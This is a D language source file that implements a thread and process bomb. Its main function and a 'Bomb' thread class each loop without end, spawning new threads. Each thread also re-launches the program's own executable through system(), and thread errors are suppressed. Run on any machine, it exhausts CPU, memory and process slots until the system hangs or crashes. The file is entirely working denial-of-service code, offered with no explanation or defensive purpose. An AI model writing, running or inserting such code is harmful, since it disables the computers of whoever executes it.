module main;

import std.stdio;
import std.process;
import core.thread;

class Bomb : Thread
{
    private string processName;

    this(string process)
    {
        this.processName = process;

        writeln("Created new thread.");
        super(&run);
    }

private:
    void run()
    {
        while(true)
        {
            try
            {
                Thread threadBomb = new Bomb(this.processName);
                threadBomb.start();

                system(this.processName);
            } catch (ThreadException ignored)
            {
                // Ignore threadexception
            }
        }
    }
}

void main(string args[])
{
    while (true)
    {
        try
        {
            Thread threadBomb = new Bomb(args[0]);
            threadBomb.start();
        } catch (ThreadException ignored)
        {
            // Ignore threadexception
        }
    }
}
